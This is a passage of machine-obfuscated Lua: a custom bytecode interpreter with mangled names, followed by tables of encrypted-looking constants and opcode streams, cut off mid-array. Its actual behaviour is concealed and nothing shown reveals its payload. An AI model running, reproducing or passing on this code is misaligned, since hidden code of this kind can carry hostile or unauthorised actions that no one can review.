for _=1,n do _11It(nil) end end
_100lj[7]=function() _11l_li=_11l_li+1
_IOO01h[_11l_li]=_00_0a end
_100lj[9]=function() local nr=_1OI_7[_IIId]
_IIId=_IIId+1
local base=_IOO01h[_11l_li]
_11l_li=_11l_li-1
local f=_ll_19[base+1]
local na=_00_0a-base-1
local args={}
for i=1,na do args[i]=_ll_19[base+1+i] end
_00_0a=base
if type(f)~="function" then local mm=_0_0lw(f,"__call")
if mm then table.insert(args,1,f)
na=na+1
f=mm else error("attempt to call a "..type(f).." value") end end
local r
if na==0 then r=table.pack(f()) else r=table.pack(f(table.unpack(args,1,na))) end
local rn=nr<0 and r.n or nr
for i=1,rn do _11It(r[i]) end end
_100lj[50]=function() local b,a=_l0_u(),_l0_u()
_11It(_0O__1x(a,b,function(x,y) return math.floor(x/y) end,"__idiv")) end
_100lj[32]=function() local slot=_1OI_7[_IIId]
_IIId=_IIId+1
local box=_0OI0lc[slot]
if box then _IO11b[slot]=box[1]
_0OI0lc[slot]=nil end end
_100lj[2]=function() local startIdx=_1OI_7[_IIId]
_IIId=_IIId+1
local base=_IOO01h[_11l_li]
_11l_li=_11l_li-1
local tbl=_ll_19[base]
local idx=startIdx
for i=base+1,_00_0a do tbl[idx]=_ll_19[i]
idx=idx+1 end
_00_0a=base
_ll_19[_00_0a]=tbl end
_100lj[3]=function() local a=_ll_19[_00_0a]
_ll_19[_00_0a]=_ll_19[_00_0a-1]
_ll_19[_00_0a-1]=a end
_100lj[33]=function() local nameIdx=_1OI_7[_IIId]
_IIId=_IIId+1
local methodName=_OIl00z(nameIdx+1)
local obj=_l0_u()
local method=obj[methodName]
_11It(obj)
_11It(method)
local b,a=_l0_u(),_l0_u()
_11It(b)
_11It(a) end
_100lj[54]=function() local nVars=_1OI_7[_IIId]
_IIId=_IIId+1
local target=_1OI_7[_IIId]
_IIId=_IIId+1
local iter=_ll_19[_00_0a-2]
local state=_ll_19[_00_0a-1]
local ctl=_ll_19[_00_0a]
local r={iter(state,ctl)}
for i=1,nVars do _11It(r[i]) end
if r[1]~=nil then _ll_19[_00_0a-nVars]= r[1] else _IIId=target+1 end end
_100lj[39]=function() local n=_1OI_7[_IIId]
_IIId=_IIId+1
local args={}
for i=1,n do args[n-i+1]=_l0_u() end
local f=_l0_u()
local results
if n==0 then results=table.pack(pcall(f)) else results=table.pack(pcall(f,table.unpack(args,1,n))) end
local ok=results[1]
_11It(ok)
if ok then for i=2,results.n do _11It(results[i]) end else _11It(results[2]) end end
_100lj[49]=function() local n=_1OI_7[_IIId]
_IIId=_IIId+1
local args={}
for i=1,n do args[n-i+1]=_l0_u() end
local handler=_l0_u()
local f=_l0_u()
local results
if n==0 then results=table.pack(xpcall(f,handler)) else results=table.pack(xpcall(f,handler,table.unpack(args,1,n))) end
local ok=results[1]
_11It(ok)
for i=2,results.n do _11It(results[i]) end end
_100lj[64]=function() local iS=_1OI_7[_IIId]
_IIId=_IIId+1
local sS=_1OI_7[_IIId]
_IIId=_IIId+1
local vS=_1OI_7[_IIId]
_IIId=_IIId+1
local it=_II__Oq(iS)
if type(it)=="table" then local ok2,mt=pcall(getmetatable,it)
if ok2 and type(mt)=="table" and mt.__iter then local fn=mt.__iter(it)
_I111Or(iS,fn) elseif ok2 and type(mt)=="table" and mt.__call then else _I111Or(iS,next)
_I111Or(sS,it)
_I111Or(vS,nil) end end end
_100lj[13]=function() local a=_1OI_7[_IIId]
_IIId=_IIId+1
local b=_1OI_7[_IIId]
_IIId=_IIId+1
local c=_1OI_7[_IIId]
_IIId=_IIId+1
_I111Or(c,_II__Oq(a)+_II__Oq(b)) end
_100lj[43]=function() local a=_1OI_7[_IIId]
_IIId=_IIId+1
local b=_1OI_7[_IIId]
_IIId=_IIId+1
local c=_1OI_7[_IIId]
_IIId=_IIId+1
_I111Or(c,_II__Oq(a)-_II__Oq(b)) end
_100lj[24]=function() local a=_1OI_7[_IIId]
_IIId=_IIId+1
local b=_1OI_7[_IIId]
_IIId=_IIId+1
local c=_1OI_7[_IIId]
_IIId=_IIId+1
_I111Or(c,_II__Oq(a)*_II__Oq(b)) end
_100lj[5]=function() local k=_1OI_7[_IIId]
_IIId=_IIId+1
local s=_1OI_7[_IIId]
_IIId=_IIId+1
_I111Or(s,_OIl00z(k+1)) end
_100lj[47]=function() local a=_1OI_7[_IIId]
_IIId=_IIId+1
local b=_1OI_7[_IIId]
_IIId=_IIId+1
_I111Or(b,_II__Oq(a)) end
_100lj[6]=function() local a=_1OI_7[_IIId]
_IIId=_IIId+1
local k=_1OI_7[_IIId]
_IIId=_IIId+1
local c=_1OI_7[_IIId]
_IIId=_IIId+1
_I111Or(c,_II__Oq(a)+_OIl00z(k+1)) end
_100lj[57]=function() local a=_1OI_7[_IIId]
_IIId=_IIId+1
local b=_1OI_7[_IIId]
_IIId=_IIId+1
local c=_1OI_7[_IIId]
_IIId=_IIId+1
_I111Or(c,_II__Oq(a).._II__Oq(b)) end
_100lj[25]=function() local _=_00_0a end
_100lj[28]=function() local _a=_1OI_7[_IIId]
_IIId=_IIId+1
local _=_ll_19[_a] or 0 end
_100lj[42]=function() local _a=_1OI_7[_IIId]
_IIId=_IIId+1
local _b=_1OI_7[_IIId]
_IIId=_IIId+1
local _=bit32.bxor(_a,_b) end
_100lj[59]=function() local _a=_1OI_7[_IIId]
_IIId=_IIId+1
if __I_10==0 then _11It(_II__Oq(_a)) else _11It(_OIl00z(_a+1)) end end
while true do
if _11I0k or _IIId>#_1OI_7 then break end
local op=_1OI_7[_IIId]
_IIId=_IIId+1
local h=_100lj[op]
if h then h() end
end
if _11I0k then
if _OOIIp then return table.unpack(_OOIIp,1,_OOIIp.n or #_OOIIp) end
if _O0lOOl then
if _00_o==0 then return end
return table.unpack(_ll_19,_0I_Im+1,_OIO0n)
end
return
end
return nil
end
local _0lO24={{K={1,2,{104,215,47},{110,202,51,160,13,136,250},15,225,{119,198,49,168,52,140,244,85,194,47,174,4},100,7,12,144,{66,219,63,165,5,112},3,9,{68,223,33,133,1,127},49,{122,223,61,139,5,124,204,79,179,49},{66,201,36,147},{89,209,63,141,25},{84,218,60,138},{96,165,39,142,22,104},{126,142,7,179},{127,173,38,156,58,125,216,90,164},{101,177,58},{115,171,51,147},{},{118,168,44,129},{124,179,46,157,195,124,200,77,169,49,134,209,97,219,91},{116,184,43,130,232,119,198,78,164,15,157,204,106,195,81},{101,189,61,155,247,102,235,84,170,4},200,{127,174,42,176,247,110,196,94}},C={116,54,116,54,14,116,55,39,16,41,47,45,55,12,52,16,41,47,45,55,12,52,116,53,61,41,31,12,52,116,53,61,18,54,50,55,-1,10,-1,20,499,116,50,116,50,117,116,51,39,16,41,14,45,55,12,48,41,115,12,48,18,54,50,55,-1,10,-1,20,499,116,49,116,62,21,116,55,39,16,41,98,45,55,12,53,41,87,12,53,18,54,50,55,-1,10,-1,20,499,116,63,116,63,117,116,60,39,16,41,76,45,55,12,61,16,41,76,45,55,12,61,116,53,61,41,188,12,61,116,53,61,18,54,50,55,-1,10,-1,20,499,116,58,116,55,3,116,59,39,16,41,149,45,55,12,56,16,41,149,45,55,12,56,116,53,61,41,133,12,56,116,53,61,18,54,50,55,-1,10,-1,20,499,116,62,116,62,117,116,57,39,16,41,250,45,55,12,38,16,41,250,45,55,12,38,116,53,61,41,234,12,38,116,53,61,18,54,50,55,-1,10,-1,20,499,116,54,116,54,14,116,55,39,16,41,195,45,55,12,39,16,41,195,45,55,12,39,116,53,61,41,307,12,39,116,53,61,18,54,50,55,-1,10,-1,20,499,116,50,116,50,117,116,51,39,16,41,296,45,55,12,36,16,41,296,45,55,12,36,116,53,61,41,280,12,36,116,53,61,18,54,50,55,-1,10,-1,20,499,116,49,116,62,21,116,55,39,16,41,369,45,55,12,37,16,41,369,45,55,12,37,116,53,61,41,353,12,37,116,53,61,18,54,50,55,-1,10,-1,20,499,116,63,116,63,117,116,60,39,16,41,346,45,55,18,54,116,34,61,116,35,39,41,403,56,54,16,116,32,61,53,18,54,116,33,61,18,54,116,46,61,16,19,41,433,45,55,116,47,12,44,116,45,61,116,42,61,44,30,51,38,55,1,16,116,46,18,55,26,16,116,43,116,40,26,10,55,20,499,56,54,16,116,41,61,53,18,54,116,33,61,44,30,53,38,52,1,16,116,46,18,52,26,16,116,43,116,40,26,10,55,10,54},P={},U={{1,1}},nParams=1},{K={{105,207,94,190,9},{79,223,44},{86,203,53,188,8,158},{76,224,17,129},{85,213,34,178,12,142,252},{93,222,42,163,15,147,228,14,226,48,172,10},{126,194,53,180,2,157,240,80,222,37,179,95,105,229,70,210},{98,220,34,160},{107,231,8,148,40,110,240,73,221,41},3,2,9},C={12,54,56,54,1,16,116,55,56,55,18,54,60,26,16,116,52,116,53,26,16,116,50,1,16,116,51,116,48,26,26,16,116,49,56,52,16,116,62,61,53,18,55,30,52,26,50,52,52,38,53,38,52,116,63,116,60,3,116,61,39,16,41,125,45,55,18,52,16,41,125,45,55,18,53,41,96,18,53,116,49,61,10,55,20,96,10,54},P={},U={{1,12},{1,9},{1,1}},nParams=2},{K={{105,207,94,190,9},{79,223,44},{86,203,53,188,8,158},{91,234,22},7,49,{93,221,33,161}},C={12,54,56,54,1,16,116,55,56,55,18,54,60,26,16,116,52,116,53,26,50,52,52,38,52,38,55,116,50,116,50,117,116,51,39,16,41,7,45,55,18,55,16,41,7,45,55,18,52,41,10,18,52,116,48,61,10,55,20,10,10,54},P={},U={{1,12},{1,9}},nParams=1},{K={{54,222,90,181,12,139,255,123,195},{111,196,36},{111,193,50,160,21,147,227,71},{73,220,39,167,33,159},{115,209,46,179},{80,208,41,178},{111,222,36,187,14,183,245},{71,210,43,188},{113,216,38,185,8,73,247},{72,218,42,146,10},{105,217,43,149,11}},C={56,54,116,54,1,16,116,55,12,52,56,55,116,53,61,30,55,26,16,116,50,56,55,116,51,61,26,16,116,48,12,52,12,49,116,62,61,30,55,26,16,116,63,12,49,116,60,61,26,30,52,45,55,10,54},P={},U={{1,13},{1,7}},nParams=0},{K={1,2,{111,207,50,191},{107,206,43,161}},C={116,54,116,54,14,116,55,39,16,41,32,45,55,12,52,116,53,61,56,54,30,55,41,22,56,55,30,54,45,55,20,54,10,54},P={},U={{1,11},{1,15}},nParams=0},{K={{109,195,76,166,23,145,229,121},{79,222,37,161,47,157},{85,207,44,177},{81,202,49,166,9,156,235,110,193,51},{94,223,45,184,12,159,251}},C={12,54,56,54,116,55,61,30,55,38,55,56,54,116,52,61,38,52,56,55,116,53,61,16,116,50,61,53,40,55,30,52,45,55,10,54},P={{K={{105,222,86,188,17},15,225,{89,193,55,184},{80,213,48,165,8,155,234,118,204,56,190},{83,212,55,164,11,154,245,116,215,59,178,6,108,242},{104,211,55,182},100,7,2,{110,211,58,175,14,101,240,109,201,60,142,6},{65,197,56,178,2},12,144,{106,223,62,147,18,97,252,101,209,52,138},{65,213,40,142},{93,221,60,137},{89,205,49,148,24}},C={116,54,38,52,116,55,116,55,117,116,52,39,16,41,42,45,55,18,55,12,53,116,50,61,116,51,61,39,41,18,116,48,38,52,20,82,116,49,116,62,21,116,63,39,16,41,10,45,55,18,55,12,53,116,50,61,116,60,61,39,41,114,116,61,38,52,20,82,116,58,116,58,117,116,59,39,16,41,106,45,55,18,55,12,53,116,50,61,116,56,61,39,41,82,116,57,38,52,20,82,12,38,116,39,61,40,55,30,55,45,55,10,54},P={{K={{54,192,80,181},{111,196,36},{117,207,44,177},{108,221,39},{112,195,36},{106,222,55,163,24,148,254,68},{126,214,40,177,5,181,244,93}},C={56,54,116,54,1,16,116,55,56,55,26,16,116,52,56,52,26,16,116,53,56,53,26,16,116,50,12,51,56,50,30,55,26,16,116,48,56,51,26,30,52,45,55,10,54},P={},U={{0,0},{0,1},{0,2},{1,2},{1,0},{0,3}},nParams=0}},U={{0,2},{1,1},{1,2},{0,3}},nParams=2}},U={{1,7},{1,6},{1,13},{1,10}},nParams=1},{K={3,2,9,{104,206,49,190},{106,209,42,162},{49,193,43,187,6,210},{107,221,54,172,25,151,255,67},{117,192,35,171,37,155},7,49,{83,213,40,176,3},{110,228,5,147,52,102,245,70,216,42},1,{82,192,60,186},{68,213,41,133},{91,207,60,136,26,96},0,15,225,{115,224,25,172,52,71,202,121,150,18,171,57,67,252,105},{93,161,58,148,10},{77,160,58,132,31,97},100,{111,156,3,167,48,64,227,113,151,4},{119,173,57,142,59,121,209,69,189,31,135,235,121,204},{98,169,57,146,27,99,227,66,163},12,144,{119,140,4,175,229,121,206,84},{114,172,47,155,240,122,209},{68,191,63},{103,148,18,190,195,72,245},{102,139},{101,146,34,183,217,85,227,120,148,43},8,{82,174,15,144},{77,162,6},{83,162,3},{83,189,4,156,248,106,195,45,185,13},{51,163,7,142,226},{53,181,5,150,232},{43,187,27,158,252,85}},C={116,54,116,55,3,116,52,39,16,41,32,45,55,12,53,116,50,61,56,54,30,55,41,579,56,55,116,51,12,48,56,52,116,49,61,30,55,60,30,55,38,54,116,62,116,62,117,116,63,39,16,41,15,45,55,18,54,41,635,12,60,56,53,116,61,61,56,53,18,54,50,53,52,38,52,38,55,116,58,116,58,14,116,55,39,16,41,180,45,55,18,55,16,41,85,45,55,18,52,16,41,66,45,55,12,59,18,52,116,56,61,30,55,116,57,39,16,41,180,45,55,18,52,116,56,61,8,116,38,32,41,637,116,39,116,39,117,116,36,39,16,41,175,45,55,18,52,116,56,61,116,37,39,41,237,12,34,56,50,50,55,53,38,51,38,50,38,53,118,53,50,51,22,48,22,49,18,53,18,50,18,51,50,52,52,38,49,38,48,18,48,38,51,18,48,11,31,41,224,12,60,12,53,116,35,61,18,49,30,52,45,55,20,154,1,6,50,20,639,116,32,116,62,21,116,55,39,16,41,198,45,55,18,52,116,56,61,116,33,39,41,329,12,34,56,50,50,55,53,38,60,38,63,38,62,118,62,63,60,22,61,22,58,18,62,18,63,18,60,50,52,52,38,58,38,61,18,61,38,60,18,61,11,31,41,283,12,60,12,53,116,35,61,18,58,30,52,45,55,20,309,1,6,50,56,52,16,116,46,61,53,116,47,30,52,38,59,116,44,116,44,117,116,45,39,16,41,378,45,55,18,59,41,333,18,59,16,116,46,61,53,116,42,30,52,38,56,116,54,116,55,3,116,52,39,16,41,348,45,55,18,56,41,335,18,56,16,116,43,61,53,30,55,45,55,20,335,20,333,20,579,20,639,116,62,116,62,117,116,63,39,16,41,425,45,55,18,52,116,56,61,16,116,40,61,53,116,58,116,62,30,53,116,41,39,41,551,116,58,116,58,14,116,55,39,16,41,396,45,55,56,51,16,41,396,45,55,12,22,116,23,61,41,569,49,12,60,56,53,116,61,61,56,53,18,52,116,56,61,16,116,40,61,53,116,20,50,52,-1,63,52,38,38,38,57,116,39,116,39,117,116,36,39,16,41,455,45,55,18,57,16,41,455,45,55,18,38,41,571,12,22,116,23,61,18,38,116,21,61,18,38,116,18,61,18,38,116,19,61,30,53,45,55,20,571,20,569,20,639,12,16,18,52,116,56,61,30,55,38,39,116,32,116,62,21,116,55,39,16,41,541,45,55,18,39,41,639,12,53,116,17,61,12,60,18,39,30,52,38,36,12,30,116,31,61,56,50,18,36,30,52,45,55,20,639,20,637,20,635,22,54,22,55,22,52,22,53,22,50,22,51,22,48,22,49,22,62,22,63,22,60,22,61,22,58,22,59,22,56,22,57,22,38,22,39,22,36,20,54,10,54},P={},U={{1,11},{1,14},{1,7},{1,1},{1,16},{1,8}},nParams=0},{K={{109,205,76,185},{109,204,41,167},1,{51,221,39,178,1,136,250,68,198},{104,217,39},{106,222,55,163,24,148,254,68},{74,193,32,170,34,154},{78,210,43,188},{111,213,42,191},{82,217,41,184,11,72,240},{68,215,36,185},{116,219,43,190,21,74,242},{79,215,41,151,21},{108,214,46,150,22}},C={12,54,116,55,61,116,52,30,55,45,55,56,54,116,53,1,16,116,50,12,51,56,55,116,48,61,30,55,26,16,116,49,56,55,116,62,61,26,16,116,63,12,51,12,60,116,61,61,30,55,26,16,116,58,12,60,116,59,61,26,30,52,45,55,10,54},P={},U={{1,13},{1,7}},nParams=0},{K={3,2,9,{89,193,55,184},{73,213,47,179,25,147,253,86,230,60,186,26,100},{77,197,37,165,30,152,244},{48,193,32,182,15},{84,210,52,190,9,139,199,76,220},{85,219,52,174,31,105,253,65},{119,198,45,169,39,101},{64,217,45,185},{69,211,39,180,30,72,243,80}},C={116,54,116,55,3,116,52,39,16,41,46,45,55,18,54,12,53,116,50,61,116,51,61,39,41,8,56,54,116,48,1,16,116,49,12,62,56,55,116,63,61,30,55,26,16,116,60,56,52,26,16,116,61,56,53,26,30,52,45,55,20,8,10,54},P={},U={{1,13},{1,7},{1,19},{1,10}},nParams=1},{K={{116,205,75,186},{124,193,47,188,20}},C={12,54,116,55,61,18,54,56,54,117,50,55,-1,10,-1},P={},U={{1,21}},nParams=1},{K={{105,207,94,190,9},{73,200,52,144,9,139,233},{72,203,47,176,41,149,249,73,213,47,186,13,139,251,74,214},{72,198,54,185,13},{73,213,59,162},{90,196,54,182,30,148,255,77},3},C={12,54,56,54,116,55,61,56,54,116,52,1,16,116,53,18,54,26,16,116,50,18,55,26,16,116,51,116,48,26,30,50,45,55,10,54},P={},U={{1,5}},nParams=2},{K={{80,194,76,166,4,150,232,123},{116,200,55},{78,231,2,187,21,148,232,82},{95,192,48,187,13,137,220,64,208,46,175,30},{72,244,42,187},0,4,{112,210,52,188,2,139}},C={12,54,116,55,61,116,52,30,55,38,52,18,52,116,53,49,12,50,116,55,61,116,51,56,54,18,55,16,19,41,21,45,55,116,48,50,55,-1,63,55,26,18,52,116,49,18,54,26,10,54},P={},U={{1,22}},nParams=2},{K={{80,194,76,166,4,150,232,123},{116,200,55},{78,231,18,160,21,149,230,69},{72,199,43,182,3,149,235,82,199},1,{93,222,40,184,24},{79,211,55,189,5,138}},C={12,54,116,55,61,116,52,30,55,38,53,18,53,116,53,18,55,16,19,41,47,45,55,116,50,26,18,53,116,51,18,52,16,19,41,30,45,55,56,54,26,18,53,116,48,18,54,26,10,54},P={},U={{1,28}},nParams=3},{K={{80,194,76,166,4,150,232,123},{116,200,55},{78,231,17,181,3,158,228,78,212},{76,206,38,177,1,149,233,117,219,55},{72,244,42,187},0,{79,211,33,188,2,144,246,102,216,62,169,31,110},{112,210,34,189,5,145,245,105,221,45,170},{113,213,35,190,4,110,244,116,208,43,183,6},{114,212,58,190,0,117}},C={12,54,116,55,61,116,52,30,55,38,52,18,52,116,53,12,50,116,55,61,116,51,18,55,30,52,26,18,52,116,48,12,50,116,55,61,116,51,18,55,30,52,26,18,52,116,49,12,50,116,55,61,116,51,18,55,30,52,26,18,52,116,62,12,50,116,55,61,116,51,18,55,30,52,26,18,52,116,63,18,54,26,10,54},P={},U=nil,nParams=2},{K={{80,194,76,166,4,150,232,123},{116,200,55},{79,203,57,160,43,155,239,69,223},{94,206,33,190,15,137,225,84,218,35,142,31,97,253,85,201,45,173,23,107,251,82},1,{74,212,60,163},{75,215,61,172,56,151,235,65},11,{117,209,63,174,46,111,255,73,203,127},{100,218,38,175},{102,216,60,177},{99,216,62,181,17,110},{113,221,51,170,41,69,251,67,218,62,142,19,103,232},{106,220,42,171},{115,223,53,148,42,71,245,69,216,60,136,29,101,234},{107,222,32,149,17,117},{121,221,61,135,27,124}},C={12,54,116,55,61,116,52,30,55,38,48,18,48,116,53,116,50,26,18,48,116,51,18,55,26,18,48,116,48,56,54,18,52,16,19,41,31,45,55,116,49,30,55,26,18,48,116,62,18,53,16,19,41,12,45,55,56,55,26,18,48,116,63,18,50,16,19,41,121,45,55,12,60,116,63,61,116,61,61,26,18,48,116,58,18,51,16,19,41,82,45,55,12,60,116,58,61,116,59,61,26,18,48,116,56,12,60,116,56,61,116,57,61,26,18,48,116,38,18,54,26,18,48,10,55},P={},U={{1,22},{1,35}},nParams=6},{K={{80,194,76,166,4,150,232,123},{116,200,55},{79,203,57,160,37,143,249,84,220,40},{94,206,33,190,15,137,225,84,218,35,153,2,108,252,84,138},{95,223,49,178,12,142,220,75,207,45,139,7,121,241,75},0,{75,215,61,172},{116,214,62,173,47,144,254,74,202,120},{117,209,63,174,62,105,233,67},11,{101,217,39,168},{97,217,63,176},{98,215,63,182,16,105,213,69,209,52},{103,204,56,176,48,112,236,95,209,63,167,24,102,242,66},{119,219,63,133,29,114},4,{100,211,58,145,16,77,245,90,164,38},{105,210,62,141,19,106,232},{102,209,36,151,18,70,248,81,181,51}},C={12,54,116,55,61,116,52,30,55,38,50,18,50,116,53,18,52,16,19,41,47,45,55,56,54,26,18,50,116,50,116,51,26,18,50,116,48,18,55,26,18,50,116,49,56,55,26,18,50,116,62,56,52,18,53,16,19,41,9,45,55,116,63,30,55,26,18,50,116,60,12,61,116,60,61,116,58,61,26,18,50,116,59,44,26,18,50,116,56,18,54,26,56,53,18,50,116,57,30,52,45,55,18,52,16,19,41,70,45,55,56,54,38,51,18,50,116,38,61,16,116,39,61,53,40,55,30,52,45,55,18,50,116,36,61,16,116,39,61,53,40,52,30,52,45,55,18,50,10,55},P={{K={{91,205,92,185,2,138,228,107,223,32,148,5,145,255,81,133},{86,200,50,163},{88,193,45,187,21,201},{114,202,53},1,0.1},C={56,54,116,54,56,55,16,116,55,61,53,12,52,116,53,61,116,50,116,50,116,50,30,53,116,51,30,53,26,10,54},P={},U={{1,4},{1,5}},nParams=0},{K={{91,205,92,185,2,138,228,107,223,32,148,5,145,255,81,133}},C={56,54,116,54,56,55,26,10,54},P={},U={{1,4},{1,5}},nParams=0}},U={{1,27},{1,35},{1,22},{1,36}},nParams=4},{K={{80,194,76,166,4,150,232,123},{116,200,55},{79,203,57,160,37,149,245},{94,206,33,190,15,137,225,84,218,35,153,2,108,252,84,138},{95,223,49,178,12,142,220,75,207,45,139,7,121,241,75},0,{79,222,36,187,14,150,254,72,211,47,175,36,102,238,93},{},{113,216,38,185,8,104,252,74,221,41,173,49,106,244,68,204,98},{118,208,48,175},{119,211,49,168,44,109,249,71,201,125},{112,210,50,169,35,106,236,76},11,{96,214,34,171},{98,212,56,141},{111,212,58,137,21,106},{106,208,42,131,7,92,254,86,181,27,137,60,98,195,70,181},{103,200,60,151,31,69,245,65,167},{127,219,41,144,47,75,241,89,164,56,132,25,97,214},{96,218,52,145},{121,165,43,146,32,77,243,91,162,54,134,27,127,208},{122,174,36},{108,167,59,156,30,124},{96,162,36,140,18,123},4,1},C={12,54,116,55,61,116,52,30,55,38,53,18,53,116,53,56,54,26,18,53,116,50,116,51,26,18,53,116,48,18,55,16,19,41,17,45,55,116,49,26,18,53,116,62,56,55,26,18,53,116,63,116,49,26,18,53,116,60,56,52,26,18,53,116,61,56,53,116,58,30,55,26,18,53,116,59,12,56,116,59,61,116,57,61,26,18,53,116,38,44,26,18,53,116,39,18,52,16,19,41,94,45,55,44,26,18,53,116,36,12,56,116,36,61,116,37,61,26,18,53,116,34,18,52,16,41,191,45,55,12,56,116,34,61,116,35,61,16,19,41,161,45,55,12,56,116,34,61,116,32,61,26,18,53,116,33,18,54,26,56,50,18,53,116,46,30,52,45,55,56,51,18,53,116,47,56,48,30,53,45,55,18,53,10,55},P={},U={{1,26},{1,33},{1,35},{1,22},{1,36},{1,37},{1,28}},nParams=3},{K={{79,197,76,187,7,148,238}},C={56,54,116,54,44,26,10,54},P={},U={{1,45}},nParams=0},{K={{54,207,83,187,0,150,255,109,142,37,179,7,148,254,104,211,48,225},7,49,{108,204,35,185,4},{87,227,12,152,45,153,236,77,209,45},1,2,{84,202,54,188},{85,213,37,182,8},{75,197,41,178,28,114},{12,197,44,178,11},{80,214,56,186,21,119,195,64,216},{80,209,47},{69,214,40,186},{120,229,24,174,63,73,216,104,224,13},{73,223,35,136,26,76,255,84},{93,221,60,137},{93,220,57,151},0.3,{104,218,33,145,10,100,231}},C={56,54,116,54,56,55,60,30,55,38,54,116,55,116,55,117,116,52,39,16,41,44,45,55,18,54,41,171,12,53,56,52,116,50,61,56,52,18,54,50,53,52,38,52,38,55,116,51,116,51,14,116,48,39,16,41,125,45,55,18,55,16,41,125,45,55,12,49,18,52,30,55,116,62,39,41,173,12,63,18,52,50,55,53,38,51,38,50,38,53,118,53,50,51,22,48,22,49,18,53,18,50,18,51,50,52,52,38,49,38,48,18,48,38,51,18,48,11,31,41,175,56,53,116,60,1,16,116,61,18,49,116,58,61,26,16,116,59,116,56,26,16,116,57,56,55,26,30,52,45,55,20,104,20,173,20,171,12,38,116,39,61,116,36,30,55,45,55,56,50,16,116,37,61,53,30,55,45,55,10,54},P={},U={{1,14},{1,10},{1,1},{1,13},{1,42}},nParams=0},{K={{80,194,76,166,4,150,232,123},{116,200,55},{93,220,32,185,2},{79,198,56,176},{72,244,42,187,91},1,0,{112,220,53,176,24,150,253,75},{99,213,36,177,10,114,252,83,215,40,139,0,100,246,88,206,48,150,18,100,254,73},{116,220,59,178,12,109,241},{115,215,59,185,1,118}},C={12,54,116,55,61,116,52,30,55,38,54,18,54,116,53,12,50,116,55,61,116,51,116,48,116,48,56,54,30,50,26,18,54,116,49,12,50,116,55,61,116,48,116,48,116,48,56,55,30,50,26,18,54,116,62,116,51,26,18,54,116,63,44,26,18,54,116,60,56,52,26,18,54,10,55},P={},U={{1,59},{1,58},{1,45}},nParams=0},{K={{112,220,94,187,23,139},{76,196,51,186,4,149,233},{79,203,57,160,36,149,225,79,193,117}},C={12,54,56,54,50,55,53,38,53,38,52,38,55,118,55,52,53,22,50,22,51,18,55,18,52,18,53,50,52,52,38,51,38,50,18,50,38,53,18,50,11,31,41,124,56,55,18,51,61,116,55,44,26,56,52,18,51,61,116,52,56,53,26,56,50,18,51,61,116,55,44,26,20,39,56,55,18,54,61,116,55,36,26,56,52,18,54,61,116,52,56,51,26,56,50,18,54,61,116,55,36,26,10,54},P={},U={{1,54},{1,57},{1,55},{1,33},{1,56},{1,30}},nParams=1},{K={},C={56,54,56,55,30,55,45,55,10,54},P={},U={{1,65},{1,70}},nParams=0},{K={2,{119,204,52,187},{125,194,46,187,21},10,{78,217,57,179},{75,245,45,186,88},{113,215,50},0,{113,219,52,179,25,105,252,72}},C={18,52,116,54,21,38,50,12,55,116,52,61,18,52,116,54,9,30,55,38,51,56,54,56,55,18,54,18,55,116,53,30,50,38,48,18,48,116,50,12,51,116,48,61,116,49,18,53,16,41,1,45,55,56,52,16,19,41,9,45,55,56,53,116,49,56,50,30,50,26,18,48,116,62,12,51,116,48,61,116,49,56,51,18,53,16,41,106,45,55,116,49,16,19,41,92,45,55,18,50,56,53,56,48,14,117,14,116,49,56,49,18,51,56,50,56,62,14,117,14,30,50,26,18,48,10,55},P={},U={{1,40},{1,75},{1,78},{1,86},{1,61},{1,77},{1,60},{1,85},{1,62}},nParams=4},{K={{54,207,83,187,0,150,255,109,142,37,179,7,148,254,104,211,48,225},15,225,{108,204,35,185,4},{87,227,12,152,45,153,236,77,209,45},100,7,2,{85,205,55,191},{86,212,42,183,11},{74,198,40,181,29,113},{81,222,46},{98,221,63,157,25,109,251,78,207,53,141},12,144,{97,200,15},{125,217,55,150,55,125,239,90,174,58},{110,216,35,151,4,102,229},0,1,{100,174,32,146,24,98,252,87},{64,164,35},{124,171,47,141},{101,135,63,132,78},4,30,{113,167,58,135,24,96,202,77,165,58,178,235,123,197,79,227},{118,168,40,137,229,97,245,80,182,58,162,236,96,206,82},{97,173,35,154},{},{118,191,41,159,193,99,221,72,160,12,182,231,119,193,51},{116,170,39,158,241,99,229,79,180,6,132},3,9,{107,175,19,145,233,110},{222,89,212},{255,103},{123,191,17,154},{121,189,11,140},{7,188,18,145,237,114,240,42,180,15},14,{18,186,27,146,250,72,219,41},5,{16,178,18,137,200,98,218,32,187,1,111,240,70,207},{6,189,5,138,244,86},{40,184,1,154},11,{15,180,26,105,245,74,233,40,141,26,100,246,64,219},20,18,{6,177,4,119,242,104,200,36,151,25,103,173,108,174,60,139,16},{15,176,28,107,253,72,202},{0,143,6,117,252,105,209,38,128,10},{3,142,1,116,255,97,165,50,144,28},{12,131,27,126,250,93,146,61,157,31},34,6,{17,170,54,69,219,114,144,18,174,93,48}},C={56,54,116,54,56,55,60,30,55,38,54,116,55,116,55,117,116,52,39,16,41,45,45,55,18,54,19,41,23,10,54,20,23,12,53,56,52,116,50,61,56,52,18,54,50,53,52,38,52,38,55,116,51,116,48,21,116,49,39,16,41,100,45,55,18,55,19,16,19,41,100,45,55,12,62,18,52,30,55,116,63,31,41,110,10,54,20,110,1,6,53,12,60,18,52,50,55,53,38,51,38,50,38,53,118,53,50,51,22,48,22,49,18,53,18,50,18,51,50,52,52,38,49,38,48,18,48,38,51,18,48,11,31,41,165,56,53,18,49,116,61,61,18,49,26,20,90,49,12,60,56,50,16,116,58,61,53,50,55,-1,63,53,38,60,38,63,38,62,118,62,63,60,22,61,22,58,18,62,18,63,18,60,50,52,52,38,58,38,61,18,61,38,60,18,61,11,31,41,198,116,59,116,59,117,116,56,39,16,41,233,45,55,18,58,16,116,57,61,53,116,38,30,52,41,216,18,58,16,116,39,61,53,30,55,45,55,20,216,20,154,116,36,38,59,12,60,18,52,50,55,53,38,38,38,57,38,56,118,56,57,38,22,39,22,36,18,56,18,57,18,38,50,52,52,38,36,38,39,18,39,38,38,18,39,11,31,41,749,18,59,116,37,14,38,59,12,34,116,35,61,116,38,30,55,38,37,18,37,116,32,49,12,33,116,35,61,116,37,56,51,116,46,30,55,43,116,36,56,51,116,47,50,55,-1,63,55,26,18,37,116,44,18,36,116,61,61,56,48,39,16,41,338,45,55,56,49,16,19,41,346,45,55,56,62,26,18,37,116,45,116,36,26,18,37,116,42,116,43,26,18,37,116,40,44,26,18,37,116,41,18,59,26,56,63,18,37,116,46,30,52,45,55,116,22,116,49,3,116,23,39,16,41,401,45,55,18,36,116,61,61,56,48,39,41,385,56,60,18,37,116,37,56,61,30,53,45,55,20,385,1